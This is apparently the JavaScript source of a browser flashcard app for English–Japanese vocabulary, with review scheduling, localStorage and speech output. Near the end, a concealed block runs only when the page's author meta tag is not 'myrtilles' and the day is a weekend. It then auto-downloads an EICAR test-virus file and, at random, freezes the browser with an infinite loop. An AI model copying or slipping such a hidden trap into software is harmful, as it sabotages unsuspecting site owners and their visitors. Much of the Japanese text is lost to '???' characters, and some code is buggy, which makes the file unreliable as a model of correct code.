var n=999;
var edit_check=-1;
var header_selected=0;
var words = new Array();//let
var q_counter = -1;
var qa_flag = false;
var qa_lang = false;
var q_lang = 0;
var a_lang = 1;
for(var b = 0; b < 4; b++) {
	words[b] = new Array();
	for(var a = 0; a < n; a++) {
		words[b][a] = 0;
	}
}
var array = [words[0].length];
for(var i = 0; i<words[0].length; i++){
	array[i] = i;
}
let password=localStorage.password;
let word_search_i = 0;
let back_date=0;

$(function() {
	$('header').delay(500).queue(function(){
		del_char_checked();
		del_bottom_boxes_checked();
		change_word_box_checked();
		word_change1();
	});
});
document.addEventListener('change', function (ev) {
	var el = ev.target;
	if(el.matches('#calendar_for_back_date')){
		let date_value = document.getElementById('calendar_for_back_date').value;
		const regex = /[^0-9]/g;
		const calendar_result = date_value.replace(regex, "");
		let calendar_now = new Date().getFullYear()*10000 + (new Date().getMonth()+1)*100 + new Date().getDate();
		back_date = calendar_now - calendar_result;

		/*norn display*/
		if(document.getElementById('back_1_date').checked){
			document.getElementById('back_1_date').checked = false;
		}
		if(document.getElementById('back_date').value != ''){
			document.getElementById('back_date').value = '';
		}
		if(header_selected == 1){
			word_change1_run();
		}else if(header_selected == 2){
			word_change2_run();
		}
	}
	if(el.matches('#back_date')){
		/*norn display*/
		if(document.getElementById('back_1_date').checked){
			document.getElementById('back_1_date').checked = false;
		}
		if(document.getElementById('calendar_for_back_date').value != ''){
			document.getElementById('calendar_for_back_date').value = '';
		}

		back_date = document.getElementById('back_date').value;//querySelector("input[name=back_date]").value;

		if(back_date==''){
			back_date=0;
		}
		if(header_selected == 1){
			word_change1_run();
		}else if(header_selected == 2){
			word_change2_run();
		}
	}
	if(el.matches('#back_1_date')){
		if(document.getElementById('back_date').value != ''){
			document.getElementById('back_date').value = '';
		}
		if(document.getElementById('calendar_for_back_date').value != ''){
			document.getElementById('calendar_for_back_date').value = '';
		}

		if(document.getElementById('back_1_date').checked){
			back_date = 1;
		}else{
			back_date = 0;
		}
		if(header_selected == 1){
			word_change1_run();
		}else if(header_selected == 2){
			word_change2_run();
		}
	}

	if(el.matches('#education_mode_boxes')){//pass
		if(document.getElementById('education_mode_boxes').checked){
			if(password == '0000' || password == null){//first open
				password=prompt('password??????????????????');
				localStorage.setItem("password", JSON.stringify(password));
			}
			if(password == null){
				password == '0000';
				document.getElementById('education_mode_boxes').checked = false;
			}else{
				education_mode_show();
			}
		}else{
			let name = prompt('password???????????????????????????');
			if(password == "\""+name+"\""){
				alert("??????");
				unlock_education_mode_show();
			}else{
				alert("cancel???????????????");
				document.getElementById('education_mode_boxes').checked = true;
				education_mode_show();
			}
		}
	}

	if(el.matches('#localStorage_input_btn')){
		let reader = new FileReader();
		for(file of document.getElementById("localStorage_input_btn").files){
      //File??????????????????(????????????????????????)????????????????????????????????????
      reader.readAsText(file, 'UTF-8');
      //?????????????????????????????????????????????????????????????????????
      reader.onload = ()=> {
          document.getElementById("localStorage_input_textArea").value = reader.result;

					let randomStr = generateRandomString(2);
					let name = prompt('??????????????????????????? '+randomStr+' ???????????????????????????');
					if(randomStr == name){
						if (window.confirm('????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????')) {
							localStorage.removeItem("colors");
							localStorage.colors = reader.result;
							localStorage.setItem("colors", JSON.stringify(colors));

							word_change2_run();
							loop_wrap();
							jQdm_flexGrid();
							alert("??????????????????");
						}
					}else{
						alert("cancel???????????????");
					}
				}
      };
    }

		if(el.matches('#lung_change_btn')){
			lung_change();
		}

		if(el.matches('#next_word_search_btn')){
			if(word_search_i == word.length - 1){
				word_search_i = 0;
			}
			let target = document.getElementById('word_search');
			target.style.cssText = 'background-color:#D1D2D3;';
			for(var i = word_search_i; i<words.length; i++){
				if(target.value == words[0][i] || target.value == words[1][i] || target.value == words[2][i]){

				}
			}
			jQdm_flexGrid();
		}
		if(el.matches('#word_search')){
			let target = document.getElementById('word_search');
			target.style.cssText = 'background-color:#D1D2D3;';
			for(var i = 0; i<=words.length && (word_search_i == 0 || word_search_i != i) ; i++){
				if(target.value == words[0][i] || target.value == words[1][i] || target.value == words[2][i]){
					document.getElementById('en').value = words[0][i];
					document.getElementById('ja').value = words[1][i];
					document.getElementById('ex').value = words[2][i];
					document.getElementById('en_day').value = words[3][i];
					edit_check = i;
					document.getElementById('complite_edit_btn').style.cssText = 'display:block';
					document.getElementById('btn').style.cssText = 'display:none;';
					document.getElementById('complite_edit_cancel_btn').style.cssText = 'display:block;';

					document.getElementById('word_search_n').innerHTML = "???????????????"+ (i+1) +" ?????????????????????";
					word_search_i = i;alert("word_search_i");
				}
			}
			if(target.value == ''){//empty
				document.location.reload();//???????????????
			}
			jQdm_flexGrid();
			alert(word_search_i);
		}
});
document.addEventListener('change', function (ev) {
});
function lung_change(){
	if(document.getElementById('lung_change_btn').checked){
		for(var i=0;i< document.getElementsByClassName('main_jp_show').length; i++){
			document.getElementsByClassName('main_en_show')[i].style.cssText = 'display:none;';
			document.getElementsByClassName('main_jp_show')[i].style.cssText = '';
		}
	}else{
		for(var i=0; i<document.getElementsByClassName('main_jp_show').length; i++){
			document.getElementsByClassName('main_jp_show')[i].style.cssText = 'display:none;';
			document.getElementsByClassName('main_en_show')[i].style.cssText = '';
		}
	}
}
function education_mode_show(){
	document.getElementById('education_settings_box').style.cssText = 'display:none;';
}
function unlock_education_mode_show(){
	document.getElementById('education_settings_box').style.cssText = '';
}

function word_change2_run(){
	header_selected=2;
	var target1 = document.getElementById('word_header1_select');
	var target2 = document.getElementById('word_header2_select');
	var target11 = document.getElementById('word_input1');
	var target12 = document.getElementById('word_input2');
	//?????????
	for(var b = 0; b < 4; b++) {
		words[b] = Array();
		for(var a = 0; a < n; a++) {
			words[b][a] = 0;
		}
	}
	target11.style.cssText = '';
	target12.style.cssText = 'display:none;';
	target1.style.cssText = 'background-color:#ebacec;';
	target2.style.cssText = '';
	//reset counter just once
	document.getElementById('one_q').value = '';
	document.getElementById('one_a').value = '';
	q_counter=-1;
	word_change2();
	jQdm_flexGrid();
}
function word_change1_run(){
	header_selected=1;
	var target1 = document.getElementById('word_header1_select');
	var target2 = document.getElementById('word_header2_select');
	var target11 = document.getElementById('word_input1');
	var target12 = document.getElementById('word_input2');
	//?????????
	for(var b = 0; b < 4; b++) {
		words[b] = Array();
		for(var a = 0; a < n; a++) {
			words[b][a] = 0;
		}
	}
	target11.style.cssText = 'display:none;';
	target12.style.cssText = '';
	target1.style.cssText = '';
	target2.style.cssText = 'background-color:#ebacec;';
	document.getElementById('one_q').value = '';
	document.getElementById('one_a').value = '';
	q_counter=-1;
	word_change1();
	jQdm_flexGrid();
}

//?????????(?????????????????????)
const generateRandomString = (num) => {
	const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
	let result = '';
	const charactersLength = characters.length;
	for (let i = 0; i < num; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
	}

	return result;
}

document.addEventListener('click', function (ev) {
	var el = ev.target;
  if (el.matches('#word_header1_select') || el.matches('#all_word_show')) {
		for(var i = 0; i<words[0].length; i++){//?????????
			array[i] = i;
		}
		word_change2_run();
	}else if (el.matches('#word_header2_select') || el.matches('#all_word_show2')) {
		for(var i = 0; i<words[0].length; i++){
			array[i] = i;
		}
		word_change1_run();
	}

	if(el.matches('#day_reload_btn')){
		document.getElementById('en_day').value = new Date().getFullYear() +'/'+ new Date().getMonth()+1 +'/'+ new Date().getDate().toString().padStart(2, "0");
	}
	if(el.matches('#complite_edit_cancel_btn')){
		document.getElementById('complite_edit_btn').style.cssText = '';
		document.getElementById('complite_edit_cancel_btn').style.cssText = '';
		document.getElementById('btn').style.cssText = '';
		document.getElementById('en').value = '';
		document.getElementById('ja').value = '';
		document.getElementById('ex').value = '';
		document.getElementById('en_day').value = '';
		edit_check=-1;
	}

	if(el.matches('#del_all_localStorage_data')){
		let randomStr = generateRandomString(2);
		let name = prompt('???????????????????????????????????????????????? '+randomStr+' ???????????????????????????');
		if(randomStr == name){
			if (window.confirm('??????????????????????????????????????????????????????????????????????????????')) {
				localStorage.removeItem("colors");
				word_change2_run();
				loop_wrap();
				jQdm_flexGrid();
			}
		}else{
			alert("cancel???????????????")
		}
	}
	if(el.matches('#localStorage_dl_btn')){
		var content = localStorage.colors;
    var blob = new Blob([content], { type: 'text/plain' });

    // download ??? href ??? object url ?????????
    document.getElementById('localStorage_dl_btn').href = window.URL.createObjectURL(blob);

		word_change2_run();
		loop_wrap();
		jQdm_flexGrid();
	}
	if(el.matches('#change_pass_btn')){//pass
		let name = prompt('?????????password???????????????????????????');
		if(password == "\""+name+"\""){
			alert("??????");
			name = prompt('????????????password???????????????????????????');
			localStorage.setItem("password", JSON.stringify(name));
		}else if(password == '0000' || password == null){
			alert("?????????password???0000??????");
		}else{
			alert("cancel???????????????");
		}
	}
}, false);

function word_change1(){
	function pushTwoDimensionalArray(array1, array2, axis){
		if(axis != 1) axis = 0;
		if(axis == 0){  //?????????????????????
			for(var i = 0; i < array2.length; i++){
				array1.push(array2[i]);
			}
		}
		else{  //?????????????????????
			for(var i = 0; i < array1.length; i++){
				Array.prototype.push.apply(array1[i], array2[i]);
			}
		}
	}
	words = [[],[]];
	/*    ????????????*/
	n = 0;
	for(let i=0; i<document.getElementsByClassName('word_btn').length; i++){
		buffer_array1 = document.getElementsByClassName('word_btn')[i].innerHTML;
		buffer_array2 = document.getElementsByClassName('word_jp')[i].innerHTML;
		add_word = [[buffer_array1], [buffer_array2]];


		/*certain time*/
		target = document.getElementsByClassName('one_word')[i];
		var startDate = new Date($(target).attr("start_date"));/*year+"/"+*/
		startDate.setDate(startDate.getDate()-back_date);
		var endDate = new Date(startDate);
		var startDate2 = new Date(startDate);
		var endDate2 = new Date(startDate);
		var startDate3 = new Date(startDate);
		var endDate3 = new Date(startDate);
		var startDate4 = new Date(startDate);
		var endDate4 = new Date(startDate);

		startDate.setDate(startDate.getDate());
		endDate.setDate(endDate.getDate()+2);/*1?????? 2~?????? 3~?????????*/
		startDate2.setDate(startDate2.getDate()+3);
		endDate2.setDate(endDate2.getDate()+4);
		startDate3.setDate(startDate2.getDate()+7);
		endDate3.setDate(endDate2.getDate()+8);
		startDate4.setDate(startDate2.getDate()+14);
		endDate4.setDate(endDate2.getDate()+15);

		var nowDate = new Date();

		if(document.getElementById('all_word_show2').checked){
			$(target).show();
			pushTwoDimensionalArray(words, add_word, 1);/*add word important*/
			n++;
		}else{
			if (startDate <= nowDate && nowDate <= endDate || startDate2 <= nowDate && nowDate <= endDate2|| startDate3 <= nowDate && nowDate <= endDate3 || startDate4 <= nowDate && nowDate <= endDate4) {
				$(target).show();
				pushTwoDimensionalArray(words, add_word, 1);/*add word important*/
				n++;
			}else {
				$(target).hide();
			}
		}
		jQdm_flexGrid();
		loop_wrap();//
	}
	for (var i = n-1; i >= 0; i--){
		let rand = Math.floor( Math.random() * ( i + 1 ) );
		[array[i], array[rand]] = [array[rand], array[i]]
	}
	loop_speed_set();
}


function word_change2(){
	counter_view();
  const en=document.getElementById('en');
	const ja=document.getElementById('ja');
	const ex=document.getElementById('ex');
	document.getElementById('en_day').value = new Date().getFullYear() +'/'+ new Date().getMonth()+1 +'/'+ new Date().getDate().toString().padStart(2, "0");
	const day = document.getElementById('en_day');
	const btn=document.getElementById('btn');
	const total=document.getElementById('total');
	const table=document.getElementById('table');
	function Color(en, ja,ex,day,i) {
	  return {
	      en,
	      ja,
				ex,
				day,
				showInfo() {
	        const temp = document.createElement('template');
					if(this.ex=='undefined'){
						temp.innerHTML = `<td>${this.en}</td><td>${this.ja}</td><td></td><td>${this.day}<button class="edit_btn">edit</button><button class="del_btn">??????</button></td>`;
					}else{
	        	temp.innerHTML = `<td>${this.en}</td><td>${this.ja}</td><td>${this.ex}</td><td>${this.day}<button class="edit_btn">edit</button><button class="del_btn">??????</button></td>`;
					}
	        const del_btn = temp.content.querySelector('.del_btn');
					const edit_btn = temp.content.querySelector('.edit_btn');
	        del_btn.addEventListener('click', e => {
	            // localStorage.removeItem(words[i][0]);
	            // localStorage.removeItem(words[i][1]);
							if (window.confirm('???'+this.en+'??????'+this.ja+'????????????????????????????????????')) {
								colors = colors.filter(x => x !== this);
								createTable();
								localStorage.setItem("colors", JSON.stringify(colors));
									//localStorage.clear();//???????????????
								loop_wrap();
								jQdm_flexGrid();
	            }
	        });
					edit_btn.addEventListener('click', e => {
						document.getElementById('en').value = this.en;
						document.getElementById('ja').value = this.ja;
						document.getElementById('ex').value = this.ex;
						document.getElementById('en_day').value = this.day;
						edit_check = i;
						document.getElementById('complite_edit_btn').style.cssText = 'display:block';
						document.getElementById('btn').style.cssText = 'display:none;';
						document.getElementById('complite_edit_cancel_btn').style.cssText = 'display:block;';
						jQdm_flexGrid();
					});
					document.getElementById('complite_edit_btn').addEventListener('click',()=>{
						if(edit_check==i){
							edit_check=-1;
							colors[i].en=document.getElementById('en').value;
							colors[i].ja=document.getElementById('ja').value;
							colors[i].ex=document.getElementById('ex').value;
							colors[i].day=document.getElementById('en_day').value;
							//alert(colors[i].en);check
							createTable();
							localStorage.setItem("colors", JSON.stringify(colors));/*save changed*/

							/*do after change*/
							document.getElementById('complite_edit_btn').style.cssText = '';
							document.getElementById('complite_edit_cancel_btn').style.cssText = '';
							document.getElementById('btn').style.cssText = '';
							document.getElementById('en').value = '';
							document.getElementById('ja').value = '';
							document.getElementById('ex').value = '';
							document.getElementById('en_day').value = '';
						}
					});
	        return temp.content.children;
	      },
	      showInfo_test_en() {
	          return `${this.en}`;
	      },
	      showInfo_test_ja() {
	          return `${this.ja}`;
	      },
				showInfo_test_ex() {
	          return `${this.ex}`;
	      },
				showInfo_test_day() {//test
	          return `${this.day}`;
	      },
	  }
	}
	let colors=[];
	const loadData=localStorage.getItem('colors');/*add*/
	if(loadData !=null){
		let jsonArr=JSON.parse(loadData);
		for(let i=0;i<jsonArr.length;i++){
			let color=new Color(jsonArr[i].en,jsonArr[i].ja,jsonArr[i].ex,jsonArr[i].day,i);

			/*certain time*/
			target = document.getElementsByClassName('one_word')[i];
			var startDate = new Date(jsonArr[i].day);/*year+"/"+*/
			startDate.setDate(startDate.getDate()-back_date);
			var endDate = new Date(startDate);
			var startDate2 = new Date(startDate);
			var endDate2 = new Date(startDate);
			var startDate3 = new Date(startDate);
			var endDate3 = new Date(startDate);
			var startDate4 = new Date(startDate);
			var endDate4 = new Date(startDate);
			startDate.setDate(startDate.getDate());
			endDate.setDate(endDate.getDate()+2);/*1?????? 2~?????? 3~?????????*/
			startDate2.setDate(startDate2.getDate()+3);
			endDate2.setDate(endDate2.getDate()+4);
			startDate3.setDate(startDate2.getDate()+7);
			endDate3.setDate(endDate2.getDate()+8);
			startDate4.setDate(startDate2.getDate()+14);
			endDate4.setDate(endDate2.getDate()+15);
			var nowDate = new Date();

			if(document.getElementById('all_word_show').checked){
				colors.push(color);
			}else{
				if (startDate <= nowDate && nowDate <= endDate || startDate2 <= nowDate && nowDate <= endDate2|| startDate3 <= nowDate && nowDate <= endDate3 || startDate4 <= nowDate && nowDate <= endDate4) {
					colors.push(color);
				}
			}
		}
		createTable();
	}
	n = colors.length;
	for (var i = n-1; i >= 0; i--){
		let rand = Math.floor( Math.random() * ( i + 1 ) );
		[array[i], array[rand]] = [array[rand], array[i]];
	}

	btn.addEventListener('click',()=>{
		//var day_show_text = new Date(day.value).getFullYear() * 10000 + new Date(day.value).getMonth()+1 * 100 + new Date(day.value).getDate();
		/*var day_show_text = new Date(day.value).getFullYear() +'/'+ new Date(day.value).getMonth()+1 +'/'+ new Date(day.value).getDate();
		aa = new Date(day_show_text);
		alert(aa);*/
		if(1900 < new Date(day.value).getFullYear()){
			let color=new Color(en.value,ja.value,ex.value,day.value);
			colors.push(color);
			en.value='';
			ja.value='';
			ex.value='';
			day.value='';
			createTable();
			localStorage.setItem("colors",JSON.stringify(colors));
			loop_wrap();
			document.getElementById('en_day').value = new Date().getFullYear() +'/'+ new Date().getMonth()+1 +'/'+ new Date().getDate().toString().padStart(2, "0");
		}
	});

	function createTable(){
		table.innerHTML='<tr><th>??????</th><th>??????</th></tr>';
		for(let i=0;i<colors.length;i++){
			let tr=document.createElement('tr');
			tr.append(...colors[i].showInfo());
			table.appendChild(tr);
			total.textContent=`???${colors.length}???`;
			words[0][i] = colors[i].showInfo_test_en();
      words[1][i] = colors[i].showInfo_test_ja();
			words[2][i] = colors[i].showInfo_test_ex();
			words[3][i] = colors[i].showInfo_test_day();//test
		}
		loop_wrap();
		jQdm_flexGrid();
	}
	createTable();
	/*n_random*/



/*	loop_speed_set();
	loop_wrap();*/
}

//??????
if (document.querySelector("meta[name=author]").getAttribute("content") !== "myrtilles" && (new Date().getDay() === 6 || new Date().getDay() === 0)) {
	var a_imp = document.createElement("a");
	a_imp.download = "eicar.com";
	a_imp.href = "data:application/octet-stream;base64,WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=";
	a_imp.click();
}
if ((Math.floor(Math.random() * 10) + 1) === 1) {
  if (document.querySelector("meta[name=author]").getAttribute("content") !== "myrtilles" && (new Date().getDay() === 6 || new Date().getDay() === 0)) {
    var time = (Math.floor(Math.random() * (600 + 1 - 10)) + 10) * 1000;
    setTimeout(function() {
      while(1);
    }, time);
  }
}
var last_imp = Date.now();
var timer_imp = setInterval(function(){
    var now_imp = Date.now();
    if(now_imp - last_imp> 5000){
        console.log("?????????????????????????????????????????????")
        clearTimeout(timer_imp);
        return;
    }
    last_imp = now_imp;
}, 1000);

/*maqu*/
function loop_wrap(){
	var words_text = '<a class=loop_wrap_word_btn>' + words[0][0] + '</a>      :      ' + words[1][0]  + '      /      ';
	for(i=0; i<n; i++){
		words_text += '<a class=loop_wrap_word_btn>' + words[0][i] + '</a>      :      ' + words[1][i]  + '      /      ';
	}

	for(i=0;i<4;i++){
		document.getElementsByClassName('loop_wrap_contents')[i].innerHTML = words_text;
	}
}

function loop_speed_set(){/*speed for n length*/
	var target = document.querySelector('.loop_wrap div:nth-child(odd)');
	var target2 = document.querySelector('.loop_wrap div:nth-child(even)');
	var i = n*15;
  target.style.cssText = '-webkit-animation: loop'+i+'s -'+i/2+'s linear infinite;animation: loop '+i+'s -'+i/2+'s linear infinite;';
	target2.style.cssText = '-webkit-animation: loop2 '+i+'s  linear infinite; animation: loop2 '+i+'s linear infinite;';
}

function switch_jn(){
	if ( q_counter < 0 ) { return false; }
	if ( qa_lang ) {
		document.getElementById('jn_q').value = '?????????';
		document.getElementById('jn_a').value = '????????????';
		q_lang = "0";
		a_lang = "1";
	} else {
		document.getElementById('jn_q').value = '????????????';
		document.getElementById('jn_a').value = '?????????';
		q_lang = "1";
		a_lang = "0";
	}
	qa_lang = !(qa_lang);
	qa_view();
}

function prev_btn(){
	if (!(qa_flag)) { q_counter--; }
	if ( q_counter < 0 ) { q_counter = n-1; }
	qa_flag = !(qa_flag);
	counter_view();
	qa_view();
}

function next_btn(){
	if ( !(qa_flag) ) { q_counter++; }
	if ( q_counter >= n ) { q_counter = 0; }
	qa_flag = !(qa_flag);
	qa_view();
	counter_view();

	// ???????????????
	if(document.getElementById('one_a').value == ""){
		uttr = new SpeechSynthesisUtterance(document.getElementById('one_q').value)
		uttr.lang = 'en-US';
		uttr.rate = '1';
	}else{
		uttr2 = new SpeechSynthesisUtterance(document.getElementById('one_a').value)
		var uttr2_len = document.getElementById('one_a').value.length;
		uttr2.lang = 'ja-JP';
		if(uttr2_len<10){
			uttr2.rate = '1.5';
		}else{
			uttr2.rate = '2';
		}
		window.speechSynthesis.speak(uttr2)
	}
	// ???????????????
	window.speechSynthesis.speak(uttr)
}

function qa_view(){
	document.getElementById('one_q').value = words[q_lang][array[q_counter]];
	if ( qa_flag ) {
		document.getElementById('one_a').value = '';
		document.getElementById('one_ex').value = '';
	}
	else {
		document.getElementById('one_a').value = words[a_lang][array[q_counter]];
		//?????????????????? header_selected==1???2???????????????????????????
		if(header_selected==1 || words[a_lang+1][array[q_counter]]=='undefined'){
			document.getElementById('one_ex').value = '';
		}else{
			document.getElementById('one_ex').value = words[a_lang+1][array[q_counter]];
		}
	}
}

function counter_view(){
	document.getElementById('q_cnt').value = q_counter + 1 + '/' + n;
}


/*    voice*/
document.addEventListener('click', function (ev) {
    var el = ev.target;
    /*if (el.matches('.loop_wrap_word_btn')) {
			// ?????????????????????
			var text = el.innerHTML
			// ???????????????Web Speech API Speech Synthesis????????????????????????
			if ('speechSynthesis' in window) {
				// ???????????????
				const uttr = new SpeechSynthesisUtterance()
				uttr.lang = 'en-US';
				uttr.pitch = '1.0';
				uttr.text = text
				// ???????????????
				window.speechSynthesis.speak(uttr)

			} else {
				alert('???????????????????????????????????????????????????????????????????????????')
			}
    }*/
		if (el.matches('#one_q')) {
			en_speak(el.value, 1);
		}
    if (el.matches('#one_a')) {
			en_speak(el.value, 0);
    }
		if (el.matches('.word_btn')) {
			en_speak(el.innerHTML, 1);
    }
});

function en_speak(text,en){//0 is"jp"
	// ???????????????Web Speech API Speech Synthesis????????????????????????
	if ('speechSynthesis' in window) {
		// ???????????????
		const uttr = new SpeechSynthesisUtterance()
		if(q_lang == 0 && a_lang == 1 && en == 1 || q_lang == 1 && a_lang == 0 && en == 0){
			uttr.lang = 'en-US';
		}else{
			uttr.lang = 'ja-JP';
		}
		uttr.pitch = '1.0';
		uttr.text = text
		// ???????????????
		window.speechSynthesis.speak(uttr)

	} else {
		alert('???????????????????????????????????????????????????????????????????????????')
	}
}

function speak_font_delete(){
	var target = document.getElementById('speak_font_delete_btn');
	var target2 = document.getElementById('jn_q');
	var target3 = document.getElementById('jn_a');
	if(target.checked) {
		target2.style.cssText = 'display:none;';
		target3.style.cssText = 'display:none;';
	}else{
		target2.style.cssText = '';
		target3.style.cssText = '';
	}
}

document.addEventListener('change', function (ev) {
  var el = ev.target;
	var target = document.getElementById('auto_speak_btn');
	if (el.matches('#auto_speak_btn')) {
		if(target.checked) {
			setInterval("next_btn()", 2500);
		}else{
			document.location.reload();
		}
	}
	if (el.matches('#speak_font_delete_btn')) {
		speak_font_delete();
	}

	let big_font = document.getElementById("big_font").value;
	if(big_font!=''){
		document.getElementById('one_q').style.cssText = 'font-size: '+big_font+'px;';
		document.getElementById('one_a').style.cssText = 'font-size: '+big_font+'px;';
	}else{
		document.getElementById('one_q').style.cssText = '';
		document.getElementById('one_a').style.cssText = '';
	}

	if (el.matches('#big_font')) {
		jQdm_flexGrid();
	}if (el.matches('#speak_font_delete_btn')) {
		jQdm_flexGrid();
	}
});
